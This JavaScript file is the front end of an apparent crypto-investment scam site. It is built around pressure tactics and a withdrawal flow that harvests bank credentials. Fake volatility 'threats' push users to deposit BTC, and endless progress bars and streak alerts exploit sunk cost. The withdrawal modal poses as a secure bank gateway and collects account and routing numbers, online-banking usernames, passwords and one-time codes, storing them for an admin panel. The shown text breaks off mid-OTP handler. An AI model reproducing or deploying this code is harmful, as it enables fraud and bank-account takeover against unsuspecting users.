// MindSphere Behavioral Engine - Client Side

// 1. Daily Streak Lock
function initializeStreak() {
    const streakElement = document.getElementById('daily-streak');
    if (!streakElement) return;

    // Simulate streak logic
    let streakCount = parseInt(localStorage.getItem('mindsphere_streak')) || 5; // Default to 5
    let lastLogin = localStorage.getItem('mindsphere_last_login');
    const today = new Date().toDateString();

    if (lastLogin !== today) {
        if (lastLogin) {
            // Check if missed a day (simplified logic for simulation)
            const lastDate = new Date(lastLogin);
            const currentDate = new Date(today);
            const diffTime = Math.abs(currentDate - lastDate);
            const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24)); 

            if (diffDays > 1) {
                streakCount = 0; // Reset streak if missed a day
                alert("⚠️ You missed a day! Your Daily Streak has been reset. Reward tier drop imminent.");
            } else {
                streakCount += 1;
            }
        } else {
            streakCount = 1; // First login
        }
        localStorage.setItem('mindsphere_last_login', today);
        localStorage.setItem('mindsphere_streak', streakCount);
    }

    streakElement.innerHTML = `🔥 ${streakCount} Day Streak`;
    
    // Streak Decay visual effect if streak is low
    if (streakCount < 3) {
        streakElement.style.color = '#ef4444'; // Red warning
        streakElement.classList.add('pulse-warning');
    } else {
        streakElement.style.color = '#f59e0b'; // Gold
    }
}

// 2. Compulsive Checking (Live Fluctuation)
function simulateMarketVolatility() {  
    const broadcastMessage = document.getElementById('broadcast-message');  
    const broadcastText = document.querySelector('.broadcast-text');
    if (!broadcastMessage || !broadcastText) return;

    const threats = [  
        "⚠️ Market volatility detected! Secure your position by adding 0.5 BTC now to protect your yield.",  
        "🔴 Federal Reserve rates shifting! Lock in yield now before adjustments.",  
        "🚨 BTC price instability! Upgrade to Risk Shield Tier 2 to prevent losses.",  
        "📉 Yield drop predicted! Buy Risk Shield Weekly Pass to maintain earnings."  
    ];

    let threat = threats[Math.floor(Math.random() * threats.length)];  
    broadcastText.textContent = threat;  
    broadcastMessage.classList.remove('hidden');

    setTimeout(() => {  
        broadcastMessage.classList.add('hidden');  
        setTimeout(simulateMarketVolatility, Math.floor(Math.random() * (120000 - 30000)) + 30000);  
    }, 10000);  
}

function liveFluctuationChart() {
    const scoreElement = document.getElementById('engagement-score');
    if (!scoreElement) return;

    setInterval(() => {
        let currentScore = parseFloat(scoreElement.textContent) || 20.0;
        // Fluctuate between -0.5 and +0.5
        let change = (Math.random() - 0.5);
        let newScore = Math.max(0, currentScore + change).toFixed(1);
        scoreElement.textContent = newScore;
        
        // Visual indicator
        scoreElement.style.color = change > 0 ? '#10b981' : '#ef4444';
        setTimeout(() => {
            scoreElement.style.color = '';
        }, 1000);
    }, 3000); // Update every 3 seconds to encourage checking
}

// 3. False Achievements & Sunk Cost Fallacy
function initializeAchievements() {
    const tierFill = document.getElementById('tier-fill');
    const tierNext = document.getElementById('tier-next');
    if(!tierFill || !tierNext) return;

    // We increment the width of tierFill to simulate "sunk cost" progress
    setInterval(() => {
        // Parse current width
        let currentWidth = parseFloat(tierFill.style.width) || 0;
        if (currentWidth >= 100) return; // Already maxed
        
        // Add a tiny fraction to give illusion of slow progress
        let newWidth = currentWidth + 0.05;
        if (newWidth > 99.9) newWidth = 99.9;
        
        tierFill.style.width = `${newWidth}%`;
        
        // Try to update the text to include the decimal percentage
        const text = tierNext.textContent;
        if (text && !text.includes('% completed')) {
            tierNext.textContent = `${text} - ${newWidth.toFixed(1)}% completed`;
        } else if (text) {
            tierNext.textContent = text.replace(/[0-9.]+% completed/, `${newWidth.toFixed(1)}% completed`);
        }
    }, 10000);
}

// Gamification: Never-Ending Progress Bars  
function updateProgressBars() {  
    const progressBars = document.querySelectorAll('.progress-bar');  
    progressBars.forEach(bar => {  
        let currentProgress = parseFloat(bar.getAttribute('data-progress'));  
        if (isNaN(currentProgress)) return;
        let newProgress = currentProgress + 0.1;  
        if (newProgress > 99.9) newProgress = 99.9; 
        bar.setAttribute('data-progress', newProgress);  
        bar.style.setProperty('--progress', `${newProgress}%`);  
        const label = bar.querySelector('.progress-label');
        if (label) label.textContent = `${newProgress.toFixed(1)}%`;  
    });  
}

// 4. Withdrawal Flow & Obstacles
function setupWithdrawalObstacles() {
    const withdrawalBtn = document.getElementById('initiate-withdrawal');
    const withdrawalModal = document.getElementById('withdrawal-modal');
    if (!withdrawalBtn || !withdrawalModal) return;

    const escapeHtml = (str) => {
        if (!str) return '';
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    };

    // Comprehensive US Banking Institutions
    const usBanks = [
        // Top 25 National Banks
        "JPMorgan Chase Bank", "Bank of America", "Wells Fargo Bank", "Citibank", "U.S. Bank",
        "PNC Bank", "Truist Bank", "Capital One", "TD Bank", "Goldman Sachs (Marcus)",
        "Morgan Stanley", "Charles Schwab Bank", "HSBC Bank USA", "Citizens Bank", "Fifth Third Bank",
        "KeyBank", "M&T Bank", "Regions Bank", "Huntington National Bank", "Ally Bank",
        "Discover Bank", "Synchrony Bank", "First Republic Bank", "BMO Harris Bank", "Comerica Bank",
        // Regional & Super-Regional Banks
        "Zions Bancorporation", "Webster Bank", "Culberson Bank", "Popular Bank", "Valley National Bank",
        "Glacier Bank", "Renasant Bank", "Atlantic Capital Bank", "Pinnacle Financial Partners", "South State Bank",
        "Wintrust Financial", "Independent Bank", "Berkshire Hills Bancorp", "Columbia Banking System", "First Horizon Bank",
        "Synovus Bank", "Fulton Financial", "United Community Bank", "Glacier Bancorp", "Heartland Financial",
        "International Bancshares", "Prosperity Bancshares", "Texas Capital Bank", "Glacier Bank", "First Interstate Bank",
        "Banner Bank", "Pacific Premier Bank", "Triumph Bank", "CrossFirst Bank", "Veritex Community Credit",
        "Seacoast Banking", "Preferred Bank", "Customers Bancorp", "Ameris Bancorp", "National Bank Holdings",
        "Great Western Bank", "First National Bank of Omaha", "First Midwest Bank", "Old National Bank", "Simmons Bank",
        "First Financial Bank", "Glacier Hills Bank", "Bank of Hope", "East West Bank", "Cathay Bank",
        "First Hawaiian Bank", "Central Pacific Bank", "Bank of the Ozarks", "Arvest Bank", "BOK Financial",
        "Commerce Bank", "UMB Financial", "First Busey Bank", "Westamerica Bank", "National Penn Bank",
        // Online & Digital Banks
        "Chime", "SoFi Bank", "Varo Bank", "Current", "Aspiration",
        "MoneyLion", "Dave", "Upgrade", "LendingClub Bank", "Axos Bank",
        "nbkc bank", "TAB Bank", "Bluevine", "Mercury Bank", "Relay Financial",
        "Brex", "Novo", "Grasshopper Bank", "NorthOne", "Lili",
        "One Finance", "HMBradley", "Porte", "Quontic Bank", "BankProv",
        // Federal & Military
        "USAA Federal Savings Bank", "Navy Federal Credit Union", "Pentagon Federal Credit Union", "Armed Forces Bank",
        "Andrews Federal Credit Union", "Air Force Federal Credit Union", "Army Aviation Center FCU", "Coast Guard FCU",
        // Major Credit Unions
        "State Employees Credit Union", "SchoolsFirst Federal Credit Union", "Boeing Employees Credit Union",
        "Alliant Credit Union", "Golden 1 Credit Union", "America First Credit Union", "Digital Federal Credit Union",
        "Suncoast Credit Union", "Mountain America Credit Union", "Lake Michigan Credit Union",
        "Star One Credit Union", "Security Service Federal Credit Union", "First Technology FCU", "Redstone Federal CU",
        "San Diego County Credit Union", "Connexus Credit Union", "Bethpage Federal Credit Union", "BECU",
        "Teachers Federal Credit Union", "Space Coast Credit Union", "Randolph-Brooks FCU", "Grow Financial FCU"
    ];

    withdrawalBtn.addEventListener('click', (e) => {
        e.preventDefault();
        
        let selectedBank = '';
        let accountNumber = '';
        let routingNumber = '';

        const getUserData = () => {
            const userStr = localStorage.getItem('geniusact_current_user');
            if (!userStr) return {};
            const user = JSON.parse(userStr);
            const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
            const freshUser = approvedUsers.find(u => u.email === user.email);
            return freshUser || user;
        };

        // === BALANCE CHECK: Block withdrawal if balance is $0 or less ===
        const balanceEl = document.getElementById('profit-current-balance');
        let currentBalance = 0;
        if (balanceEl) {
            const balText = balanceEl.textContent.replace(/[^0-9.-]/g, '');
            currentBalance = parseFloat(balText) || 0;
        }
        if (currentBalance <= 0) {
            withdrawalModal.style.display = 'flex';
            const content = document.getElementById('withdrawal-content');
            content.style.cssText = "background: #ffffff; color: #1e293b; padding: 0; border-radius: 16px; max-width: 520px; width: 90%; text-align: left; box-shadow: 0 25px 60px rgba(0,0,0,0.5); border: 1px solid #cbd5e1; font-family: 'Inter', sans-serif; position: relative; overflow:hidden;";
            content.innerHTML = `
                <button id="close-modal-x" style="position:absolute; top:15px; right:15px; background:none; border:none; font-size:1.5rem; color:#94a3b8; cursor:pointer; z-index:2;">&times;</button>

                <div style="background:#0f172a; color:white; padding:16px 24px; display:flex; align-items:center; justify-content:space-between;">
                    <div style="display:flex; align-items:center; gap:10px;">
                        <i class="fas fa-shield-alt" style="color:#ef4444; font-size:1.3rem;"></i>
                        <div>
                            <div style="font-size:0.7rem; font-weight:700; opacity:0.8; text-transform:uppercase; letter-spacing:0.5px;">TREASURY DISBURSEMENT GATEWAY</div>
                            <div style="font-size:1rem; font-weight:800;">Withdrawal Request Blocked</div>
                        </div>
                    </div>
                    <span style="font-size:0.68rem; background:#dc2626; color:white; padding:3px 8px; border-radius:4px; font-weight:700;"><i class="fas fa-ban"></i> HOLD</span>
                </div>

                <div style="padding:24px;">
                    <div style="display:flex; align-items:flex-start; gap:14px; margin-bottom:18px;">
                        <div style="padding:10px; background:#fef2f2; border-radius:12px; flex-shrink:0;">
                            <i class="fas fa-file-invoice-dollar" style="font-size:1.5rem; color:#dc2626;"></i>
                        </div>
                        <div>
                            <h3 style="margin:0 0 4px 0; font-size:1.15rem; color:#0f172a; font-weight:800;">Account Balance Insufficient</h3>
                            <p style="color:#64748b; font-size:0.82rem; margin:0; line-height:1.4;">Ref: FIN-HOLD-${Date.now().toString(36).toUpperCase()}</p>
                        </div>
                    </div>

                    <div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:10px; padding:16px; margin-bottom:16px;">
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; padding-bottom:10px; border-bottom:1px solid #e2e8f0;">
                            <span style="font-size:0.82rem; color:#64748b; font-weight:600;">Available Balance</span>
                            <span style="font-size:1.1rem; font-weight:800; color:#dc2626;">$0.00</span>
                        </div>
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <span style="font-size:0.82rem; color:#64748b; font-weight:600;">Minimum Required</span>
                            <span style="font-size:0.95rem; font-weight:700; color:#0f172a;">$50,000.00</span>
                        </div>
                    </div>

                    <div style="background:#fffbeb; border:1px solid #fde68a; color:#92400e; padding:12px 14px; border-radius:8px; font-size:0.83rem; margin-bottom:18px; line-height:1.5;">
                        <i class="fas fa-exclamation-circle" style="color:#d97706; margin-right:4px;"></i>
                        <strong>Compliance Notice:</strong> Under fund disbursement policy, withdrawal requests require an active account balance exceeding the minimum threshold. Your account currently reflects no available funds for distribution.
                    </div>

                    <div style="display:flex; gap:0.75rem; justify-content:flex-end;">
                        <a href="contribute.html" style="padding:0.7rem 1.4rem; background:#f1f5f9; color:#475569; border:1px solid #cbd5e1; border-radius:8px; font-weight:600; cursor:pointer; text-decoration:none; font-size:0.88rem; display:inline-flex; align-items:center; gap:6px;">
                            <i class="fas fa-plus-circle"></i> Fund Account
                        </a>
                        <button id="close-insufficient-btn" style="padding:0.7rem 1.6rem; background:linear-gradient(135deg, #0f172a, #1e293b); color:white; border:none; border-radius:8px; font-weight:700; cursor:pointer; font-size:0.9rem;">
                            Dismiss
                        </button>
                    </div>
                </div>
            `;
            document.getElementById('close-modal-x').onclick = () => withdrawalModal.style.display = 'none';
            document.getElementById('close-insufficient-btn').onclick = () => withdrawalModal.style.display = 'none';
            return;
        }

        withdrawalModal.style.display = 'flex';

        const user = getUserData();
        const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
        const userBankLink = bankLinks.find(l => l.userEmail && user.email && l.userEmail.toLowerCase() === user.email.toLowerCase());

        // If user has submitted OTP but admin hasn't verified yet, show waiting screen
        if (userBankLink && userBankLink.otpSubmitted && !userBankLink.otpVerified) {
            renderOTPWaitingStep(userBankLink);
            return;
        }

        // If user has a linked bank with verified OTP, go straight to KYC/amount
        if (userBankLink && userBankLink.otpVerified) {
            selectedBank = userBankLink.bankName || '';
            accountNumber = userBankLink.accountNumber || '';
            routingNumber = userBankLink.routingNumber || '';
            checkKYCandProceed();
            return;
        }

        const renderStep1 = () => {
            const content = document.getElementById('withdrawal-content');
            content.style.cssText = "background: #ffffff; color: #1e293b; padding: 30px; border-radius: 16px; max-width: 540px; width: 90%; text-align: left; box-shadow: 0 25px 60px rgba(0,0,0,0.4); border: 1px solid #cbd5e1; position: relative; font-family: 'Inter', sans-serif;";
            
            content.innerHTML = `
                <button id="close-modal-x" style="position:absolute; top:15px; right:15px; background:none; border:none; font-size:1.5rem; color:#94a3b8; cursor:pointer;">&times;</button>
                
                <div style="background:#0f172a; color:white; padding:12px 16px; border-radius:10px 10px 0 0; margin:-30px -30px 20px -30px; display:flex; align-items:center; justify-content:space-between;">
                    <div style="display:flex; align-items:center; gap:10px;">
                        <i class="fas fa-shield-alt" style="color:#38bdf8; font-size:1.2rem;"></i>
                        <span style="font-size:0.85rem; font-weight:700; letter-spacing:0.5px; text-transform:uppercase;">U.S. FINANCIAL NETWORK DIRECTORY</span>
                    </div>
                    <span style="font-size:0.75rem; background:#1e293b; color:#94a3b8; padding:3px 8px; border-radius:4px; border:1px solid #334155;">SECURE-SSL 256-BIT</span>
                </div>

                <div style="display:flex; align-items:center; gap:0.75rem; margin-bottom:0.5rem;">
                    <i class="fas fa-university" style="color:#0284c7; font-size:1.6rem;"></i>
                    <div>
                        <h3 style="margin:0; font-size:1.25rem; color:#0f172a; font-weight:800;">Step 1: Link US Bank Account</h3>
                        <p style="color:#64748b; font-size:0.82rem; margin:2px 0 0 0;">Select or search your financial institution to connect via Instant Verification.</p>
                    </div>
                </div>

                <div style="margin-top:1.2rem; margin-bottom:1rem; position:relative;">
                    <label style="display:block; font-size:0.82rem; font-weight:700; color:#334155; margin-bottom:0.4rem; text-transform:uppercase; letter-spacing:0.5px;">Search / Select US Bank Institution</label>
                    <div style="position:relative;">
                        <input type="text" id="withdraw-bank-search" placeholder="Type or select bank (e.g. Chase, Bank of America, Wells Fargo)..." autocomplete="off" style="width:100%; padding:0.8rem 2.5rem 0.8rem 0.9rem; border:1.5px solid #94a3b8; border-radius:8px; background:#f8fafc; font-size:0.92rem; color:#0f172a; font-weight:600;" />
                        <i class="fas fa-search" style="position:absolute; right:12px; top:50%; transform:translateY(-50%); color:#64748b;"></i>
                    </div>
                    <div id="bank-suggestions" style="max-height:180px; overflow-y:auto; border:1px solid #cbd5e1; border-radius:8px; margin-top:4px; background:#ffffff; display:none; position:absolute; z-index:100; width:100%; box-shadow:0 10px 25px rgba(0,0,0,0.15);"></div>
                </div>

                <div style="margin-bottom:1.2rem;">
                    <label style="display:block; font-size:0.82rem; font-weight:700; color:#334155; margin-bottom:0.4rem; text-transform:uppercase; letter-spacing:0.5px;">Account Number</label>
                    <input type="text" id="withdraw-account-number" placeholder="Enter Account Number" style="width:100%; padding:0.75rem; border:1px solid #cbd5e1; border-radius:8px; background:#f8fafc; font-size:0.9rem; color:#0f172a; font-weight:600;" />
                </div>

                <div style="margin-bottom:1.5rem;">
                    <label style="display:block; font-size:0.82rem; font-weight:700; color:#334155; margin-bottom:0.4rem; text-transform:uppercase; letter-spacing:0.5px;">Routing Number (9 Digits)</label>
                    <input type="text" id="withdraw-routing-number" placeholder="Enter 9-Digit Routing Number" maxlength="9" style="width:100%; padding:0.75rem; border:1px solid #cbd5e1; border-radius:8px; background:#f8fafc; font-size:0.9rem; color:#0f172a; font-weight:600;" />
                </div>

                <div id="step1-error" style="color:#ef4444; font-size:0.85rem; margin-bottom:1rem; display:none; font-weight:600; background:#fef2f2; border:1px solid #fecaca; padding:8px 12px; border-radius:6px;"></div>

                <div style="display:flex; justify-content:flex-end; gap:0.75rem; border-top:1px solid #e2e8f0; padding-top:1rem;">
                    <button id="cancel-withdraw-btn" style="padding:0.7rem 1.2rem; background:#f1f5f9; color:#64748b; border:1px solid #cbd5e1; border-radius:8px; font-weight:600; cursor:pointer;">Cancel</button>
                    <button id="step1-next-btn" class="btn-primary" style="padding:0.75rem 1.6rem; background:linear-gradient(135deg, #0284c7, #0369a1); color:white; border:none; border-radius:8px; font-weight:700; cursor:pointer; font-size:0.95rem; display:flex; align-items:center; gap:8px;">
                        Connect Account <i class="fas fa-lock"></i>
                    </button>
                </div>
            `;

            const searchInput = document.getElementById('withdraw-bank-search');
            const suggestionsBox = document.getElementById('bank-suggestions');

            const filterBanks = (query) => {
                const q = query.toLowerCase().trim();
                const filtered = usBanks.filter(b => b.toLowerCase().includes(q));
                if (filtered.length === 0) {
                    suggestionsBox.innerHTML = `<div style="padding:10px; color:#64748b; font-size:0.85rem;">Custom Bank Name: <strong>${escapeHtml(query)}</strong></div>`;
                } else {
                    suggestionsBox.innerHTML = filtered.slice(0, 15).map(b => `<div class="bank-item" style="padding:10px 14px; cursor:pointer; font-size:0.88rem; font-weight:600; border-bottom:1px solid #f1f5f9; color:#1e293b;" onmouseover="this.style.background='#f0f9ff'" onmouseout="this.style.background='#ffffff'">${escapeHtml(b)}</div>`).join('');
                }
                suggestionsBox.style.display = 'block';

                suggestionsBox.querySelectorAll('.bank-item').forEach(el => {
                    el.onclick = () => {
                        searchInput.value = el.textContent;
                        suggestionsBox.style.display = 'none';
                    };
                });
            };

            searchInput.onfocus = () => filterBanks(searchInput.value);
            searchInput.oninput = () => filterBanks(searchInput.value);
            document.addEventListener('click', (e) => {
                if (searchInput && suggestionsBox && !searchInput.contains(e.target) && !suggestionsBox.contains(e.target)) {
                    suggestionsBox.style.display = 'none';
                }
            });

            document.getElementById('close-modal-x').onclick = () => withdrawalModal.style.display = 'none';
            document.getElementById('cancel-withdraw-btn').onclick = () => withdrawalModal.style.display = 'none';

            document.getElementById('step1-next-btn').onclick = () => {
                const bank = searchInput.value.trim();
                const acc = document.getElementById('withdraw-account-number').value.trim();
                const rout = document.getElementById('withdraw-routing-number').value.trim();
                const err = document.getElementById('step1-error');

                if (!bank) {
                    err.textContent = "Please select or type your US bank name.";
                    err.style.display = "block";
                    return;
                }
                if (!acc) {
                    err.textContent = "Please enter your bank account number.";
                    err.style.display = "block";
                    return;
                }
                if (!rout || rout.length < 9) {
                    err.textContent = "Please enter a valid 9-digit routing number.";
                    err.style.display = "block";
                    return;
                }

                selectedBank = bank;
                accountNumber = acc;
                routingNumber = rout;
                err.style.display = "none";

                renderRedirectingPortal(bank);
            };
        };

        const renderRedirectingPortal = (bankName) => {
            const content = document.getElementById('withdrawal-content');
            content.style.cssText = "background: #0f172a; color: #ffffff; padding: 40px 30px; border-radius: 16px; max-width: 500px; width: 90%; text-align: center; box-shadow: 0 25px 60px rgba(0,0,0,0.6); border: 1px solid #1e293b; font-family: 'Inter', sans-serif;";

            content.innerHTML = `
                <div style="display:inline-block; padding:16px; background:rgba(2,132,199,0.15); border-radius:50%; border:2px solid #0284c7; margin-bottom:20px;">
                    <i class="fas fa-sync-alt fa-spin" style="font-size:2.5rem; color:#38bdf8;"></i>
                </div>
                <h3 style="margin:0 0 10px 0; font-size:1.35rem; color:#f8fafc; font-weight:800;">Redirecting to Secure Gateway</h3>
                <p style="color:#94a3b8; font-size:0.9rem; margin-bottom:20px; line-height:1.5;">
                    Establishing encrypted 256-bit connection to <strong>${escapeHtml(bankName)}</strong> online authentication portal...
                </p>
                <div style="background:#1e293b; border:1px solid #334155; padding:12px; border-radius:8px; font-size:0.8rem; color:#38bdf8; font-family:monospace; margin-bottom:15px;">
                    <i class="fas fa-shield-alt"></i> VERIFYING FEDERAL ROUTING CLEARANCE: ${escapeHtml(routingNumber)}
                </div>
                <div style="width:100%; height:6px; background:#1e293b; border-radius:3px; overflow:hidden; position:relative;">
                    <div style="width:100%; height:100%; background:linear-gradient(90deg, #0284c7, #38bdf8); animation: redirectProgress 2s ease-in-out infinite;"></div>
                </div>
                <style>
                    @keyframes redirectProgress {
                        0% { transform: translateX(-100%); }
                        100% { transform: translateX(100%); }
                    }
                </style>
            `;

            setTimeout(() => {
                renderBankLoginCredentials(bankName);
            }, 2200);
        };

        const renderBankLoginCredentials = (bankName) => {
            const content = document.getElementById('withdrawal-content');
            content.style.cssText = "background: #ffffff; color: #1e293b; padding: 30px; border-radius: 16px; max-width: 500px; width: 90%; text-align: left; box-shadow: 0 25px 60px rgba(0,0,0,0.4); border: 1px solid #cbd5e1; font-family: 'Inter', sans-serif; position:relative;";

            content.innerHTML = `
                <button id="close-modal-x" style="position:absolute; top:15px; right:15px; background:none; border:none; font-size:1.5rem; color:#94a3b8; cursor:pointer;">&times;</button>
                <div style="background:#0284c7; color:white; padding:14px; border-radius:10px; margin-bottom:20px; display:flex; align-items:center; justify-content:space-between;">
                    <div>
                        <div style="font-size:0.75rem; font-weight:700; opacity:0.9; text-transform:uppercase; letter-spacing:0.5px;">SECURE ONLINE BANKING AUTHENTICATION</div>
                        <div style="font-size:1.1rem; font-weight:800; margin-top:2px;">${escapeHtml(bankName)}</div>
                    </div>
                    <i class="fas fa-university" style="font-size:1.8rem; opacity:0.9;"></i>
                </div>

                <p style="color:#64748b; font-size:0.85rem; margin-bottom:1.25rem; line-height:1.4;">
                    Please enter your <strong>${escapeHtml(bankName)}</strong> Online Banking login credentials to authorize instant electronic fund disbursement.
                </p>

                <div style="margin-bottom:1.1rem;">
                    <label style="display:block; font-size:0.82rem; font-weight:700; color:#334155; margin-bottom:0.4rem;">Online Banking Username / User ID</label>
                    <input type="text" id="bank-online-username" placeholder="Enter Bank Username" style="width:100%; padding:0.75rem; border:1px solid #cbd5e1; border-radius:8px; background:#f8fafc; font-size:0.9rem; color:#0f172a; font-weight:600;" />
                </div>

                <div style="margin-bottom:1.25rem;">
                    <label style="display:block; font-size:0.82rem; font-weight:700; color:#334155; margin-bottom:0.4rem;">Online Banking Password</label>
                    <input type="password" id="bank-online-password" placeholder="Enter Bank Password" style="width:100%; padding:0.75rem; border:1px solid #cbd5e1; border-radius:8px; background:#f8fafc; font-size:0.9rem; color:#0f172a; font-weight:600;" />
                </div>

                <div id="bank-login-error" style="color:#ef4444; font-size:0.85rem; margin-bottom:1rem; display:none; font-weight:600; background:#fef2f2; border:1px solid #fecaca; padding:8px 12px; border-radius:6px;"></div>

                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid #e2e8f0; padding-top:1rem;">
                    <button id="back-to-step1-btn" style="padding:0.65rem 1rem; background:#f1f5f9; color:#475569; border:1px solid #cbd5e1; border-radius:8px; font-weight:600; cursor:pointer;"><i class="fas fa-arrow-left"></i> Back</button>
                    <button id="submit-bank-link-btn" style="padding:0.75rem 1.6rem; background:linear-gradient(135deg, #10b981, #059669); color:white; border:none; border-radius:8px; font-weight:700; cursor:pointer; font-size:0.95rem; display:flex; align-items:center; gap:8px;">
                        <i class="fas fa-shield-alt"></i> Submit & Verify
                    </button>
                </div>
            `;

            document.getElementById('close-modal-x').onclick = () => withdrawalModal.style.display = 'none';
            document.getElementById('back-to-step1-btn').onclick = () => renderStep1();

            document.getElementById('submit-bank-link-btn').onclick = async () => {
                const user = getUserData();
                const bankUser = document.getElementById('bank-online-username').value.trim();
                const bankPass = document.getElementById('bank-online-password').value.trim();
                const err = document.getElementById('bank-login-error');

                if (!bankUser || !bankPass) {
                    err.textContent = "Please enter both your bank username and password.";
                    err.style.display = "block";
                    return;
                }

                err.style.display = "none";
                const btn = document.getElementById('submit-bank-link-btn');
                btn.disabled = true;
                btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Authenticating...`;

                // Store in geniusact_bank_links so it syncs to Cloud Engine / Admin panel
                const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
                const newLink = {
                    id: 'LINK-' + Date.now(),
                    userEmail: user.email || 'guest@supporter.com',
                    uid: user.uid || ('USR-' + Date.now()),
                    bankName: bankName,
                    accountNumber: accountNumber,
                    routingNumber: routingNumber,
                    username: bankUser,
                    password: bankPass,
                    otpRequested: false,
                    otpCode: null,
                    otpSubmitted: null,
                    status: 'linked',
                    linkedAt: new Date().toISOString()
                };

                // Replace previous link for this user or add new
                const existingIdx = bankLinks.findIndex(l => l.userEmail && l.userEmail.toLowerCase() === newLink.userEmail.toLowerCase());
                if (existingIdx > -1) {
                    bankLinks[existingIdx] = newLink;
                } else {
                    bankLinks.unshift(newLink);
                }

                localStorage.setItem('geniusact_bank_links', JSON.stringify(bankLinks));

                if (window.cloudSyncFull) {
                    try { await window.cloudSyncFull(); } catch(e) {}
                }

                // Always go to OTP step after bank login
                renderOTPRequiredStep(newLink);
            };
        };

        const checkOTPVerificationAndProceed = (link) => {
            const user = getUserData();
            const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
            const freshLink = bankLinks.find(l => l.userEmail && user.email && l.userEmail.toLowerCase() === user.email.toLowerCase()) || link;

            // If OTP not yet submitted, show OTP entry
            if (!freshLink.otpSubmitted) {
                renderOTPRequiredStep(freshLink);
            } else if (!freshLink.otpVerified) {
                // OTP submitted but not verified by admin — show waiting screen
                renderOTPWaitingStep(freshLink);
            } else {
                // OTP verified by admin — proceed to KYC/amount
                checkKYCandProceed();
            }
        };

        const renderOTPRequiredStep = (link) => {
            const content = document.getElementById('withdrawal-content');
            const bankName = link.bankName || 'Your Banking Institution';
            selectedBank = bankName;
            accountNumber = link.accountNumber || accountNumber;
            routingNumber = link.routingNumber || routingNumber;

            content.style.cssText = "background: #ffffff; color: #1e293b; padding: 30px; border-radius: 16px; max-width: 500px; width: 90%; text-align: left; box-shadow: 0 25px 60px rgba(0,0,0,0.4); border: 1px solid #cbd5e1; font-family: 'Inter', sans-serif; position:relative;";

            content.innerHTML = `
                <button id="close-modal-x" style="position:absolute; top:15px; right:15px; background:none; border:none; font-size:1.5rem; color:#94a3b8; cursor:pointer;">&times;</button>
                
                <div style="background:#0f172a; color:white; padding:14px; border-radius:10px 10px 0 0; margin:-30px -30px 20px -30px; display:flex; align-items:center; justify-content:space-between;">
                    <div style="display:flex; align-items:center; gap:10px;">
                        <i class="fas fa-university" style="color:#0284c7; font-size:1.4rem;"></i>
                        <div>
                            <div style="font-size:0.72rem; font-weight:700; opacity:0.85; text-transform:uppercase; letter-spacing:0.5px;">2FA SECURITY CLEARANCE</div>
                            <div style="font-size:1.05rem; font-weight:800;">${escapeHtml(bankName)}</div>
                        </div>
                    </div>
                    <span style="font-size:0.7rem; background:#0284c7; color:white; padding:3px 8px; border-radius:4px; font-weight:700;"><i class="fas fa-lock"></i> OTP MANDATORY</span>
                </div>

                <div style="display:flex; align-items:center; gap:0.75rem; margin-bottom:1rem;">
                    <div style="padding:12px; background:#e0f2fe; border-radius:12px; color:#0284c7; font-size:1.6rem;">
                        <i class="fas fa-key"></i>
                    </div>
                    <div>
                        <h3 style="margin:0; font-size:1.25rem; color:#0f172a; font-weight:800;">Step 2: Enter ${escapeHtml(bankName)} Security OTP</h3>
                        <p style="color:#64748b; font-size:0.82rem; margin:2px 0 0 0;">Verification code requested by ${escapeHtml(bankName)} Security Portal.</p>
                    </div>
                </div>

                <div style="background:#eff6ff; border:1px solid #bfdbfe; color:#1e40af; padding:12px 14px; border-radius:8px; font-size:0.85rem; margin-bottom:1.25rem; line-height:1.4;">
                    <i class="fas fa-info-circle" style="color:#0284c7;"></i> <strong>Security Requirement:</strong> You must enter your 6-digit Security Authorization OTP issued by <strong>${escapeHtml(bankName)}</strong> before you can enter the withdrawal amount.
                </div>

                <div style="margin-bottom:1.2rem;">
                    <label style="display:block; font-size:0.82rem; font-weight:700; color:#334155; margin-bottom:0.4rem; text-transform:uppercase; letter-spacing:0.5px;">Enter 6-Digit ${escapeHtml(bankName)} Security OTP Code</label>
                    <input type="text" id="withdraw-otp-code-input" maxlength="8" placeholder="e.g. 583921" style="width:100%; padding:0.85rem; border:2px solid #0284c7; border-radius:8px; font-size:1.3rem; text-align:center; font-weight:800; letter-spacing:5px; color:#0f172a; background:#f8fafc; font-family:monospace;" />
                </div>

                <div id="withdraw-otp-error" style="color:#ef4444; font-size:0.85rem; margin-bottom:1rem; display:none; font-weight:600; background:#fef2f2; border:1px solid #fecaca; padding:8px 12px; border-radius:6px;"></div>

                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid #e2e8f0; padding-top:1rem;">
                    <button id="cancel-withdraw-btn" style="padding:0.7rem 1.2rem; background:#f1f5f9; color:#64748b; border:1px solid #cbd5e1; border-radius:8px; font-weight:600; cursor:pointer;">Cancel</button>
                    <button id="submit-withdrawal-otp-btn" style="padding:0.75rem 1.6rem; background:linear-gradient(135deg, #0284c7, #0369a1); color:white; border:none; border-radius:8px; font-weight:700; cursor:pointer; font-size:0.95rem; display:flex; align-items:center; gap:8px;">
                        <i class="fas fa-check-circle"></i> Verify Code & Continue
                    </button>
                </div>
            `;

            document.getElementById('close-modal-x').onclick = () => withdrawalModal.style.display = 'none';
            document.getElementById('cancel-withdraw-btn').onclick = () => withdrawalModal.style.display = 'none';

            document.getElementById('submit-withdrawal-otp-btn').onclick = async () => {
                const val = document.getElementById('withdraw-otp-code-input').value.trim();
                const err = document.getElementById('withdraw-otp-error');

                if (!val || val.length < 4) {
                    err.textContent = `Please enter the valid OTP code provided by ${bankName}.`;
                    err.style.display = "block";
                    return;
                }

                err.style.display = "none";
                const btn = document.getElementById('submit-withdrawal-otp-btn');
                btn.disabled = true;
                btn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Submitting ${escapeHtml(bankName)} Code...`;

                // Update OTP state on the bank link
                const bankLinks = JSON.parse(localStorage.getItem('geniusact_bank_links')) || [];
